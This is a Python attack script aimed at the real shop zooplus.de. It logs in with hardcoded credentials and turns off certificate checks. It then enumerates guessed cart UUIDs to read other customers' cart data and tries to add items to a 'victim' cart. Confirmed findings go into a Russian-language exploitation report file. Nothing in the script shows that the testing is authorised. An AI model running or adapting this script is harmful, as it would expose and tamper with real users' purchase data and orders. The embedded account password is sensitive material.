#!/usr/bin/env python3
"""Verify cart IDOR - check if we can access real user data"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# Get our own cart
print("[*] Getting our own cart...")
our_cart_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
try:
    resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{our_cart_uuid}", timeout=5, verify=False)
    if resp.status_code == 200:
        our_cart = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        our_cart_str = json.dumps(our_cart, sort_keys=True)
        print(f"  [OK] Our cart: {our_cart_str[:200]}\n")
except: pass

# Try to enumerate other carts
print("[*] Testing cart enumeration...")
# Generate UUIDs based on patterns
test_uuids = [
    "00000000-0000-0000-0000-000000000000",
    "11111111-1111-1111-1111-111111111111",
    "22222222-2222-2222-2222-222222222222",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    # Try incrementing our UUID
    "6bd223b4-5040-4faa-ba85-6a85c1ec2d51",
    "6bd223b4-5040-4faa-ba85-6a85c1ec2d4f",
    "6bd223b4-5040-4faa-ba85-6a85c1ec2d52",
    # Try common patterns
    "a0000000-0000-0000-0000-000000000000",
    "b0000000-0000-0000-0000-000000000000",
]

for cart_uuid in test_uuids:
    try:
        resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{cart_uuid}", timeout=3, verify=False)
        if resp.status_code == 200:
            cart = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(cart, dict) and cart:
                cart_str = json.dumps(cart, sort_keys=True)
                
                # Check if cart has actual data (not empty)
                if any(key in cart_str.lower() for key in ['article', 'item', 'product', 'price', 'total', 'quantity']):
                    # Check if it's different from our cart
                    if cart_str != our_cart_str:
                        print(f"  [CRITICAL] IDOR - Different cart data: {cart_uuid}")
                        print(f"      Data: {cart_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": f"/checkout/api/cart-api/v2/cart/{cart_uuid}",
                            "cart_uuid": cart_uuid,
                            "data": cart_str[:500]
                        })
                    elif any(key in cart_str.lower() for key in ['customer', 'user', 'email', 'address']):
                        print(f"  [CRITICAL] IDOR - Cart with user data: {cart_uuid}")
                        print(f"      Data: {cart_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": f"/checkout/api/cart-api/v2/cart/{cart_uuid}",
                            "cart_uuid": cart_uuid,
                            "data": cart_str[:500]
                        })
    except: pass

# Try to modify other user's cart
print("\n[*] Testing cart modification (IDOR)...")
victim_cart_uuid = "00000000-0000-0000-0000-000000000000"
try:
    # Try to add item to victim's cart
    payload = {
        "articleId": "test123",
        "quantity": 1
    }
    resp = s.post(
        f"{base}/checkout/api/cart-api/v2/cart/{victim_cart_uuid}/items",
        json=payload,
        timeout=3,
        verify=False
    )
    if resp.status_code in [200, 201]:
        print(f"  [CRITICAL] Can modify victim's cart: {victim_cart_uuid}")
        found_vulns.append({
            "type": "idor_cart_modification",
            "severity": "CRITICAL",
            "endpoint": f"/checkout/api/cart-api/v2/cart/{victim_cart_uuid}/items",
            "cart_uuid": victim_cart_uuid,
            "action": "cart_modification"
        })
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL IDOR vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print(f"    Cart UUID: {v['cart_uuid']}")
        if 'data' in v:
            print(f"    Data: {v['data'][:200]}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ IDOR УЯЗВИМОСТЬ - CART API\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Cart UUID:** `{v['cart_uuid']}`\n\n")
            f.write(f"**Description:** Критичная IDOR уязвимость позволяет получать и модифицировать корзины других пользователей.\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'action' in v:
                f.write(f"**Action:** `{v['action']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:** Можно просматривать и модифицировать корзины других пользователей, что может привести к:\n")
            f.write("- Раскрытию информации о покупках\n")
            f.write("- Модификации заказов\n")
            f.write("- Финансовым потерям\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Cart IDOR not confirmed - all carts return same/empty data")

print("=" * 70)

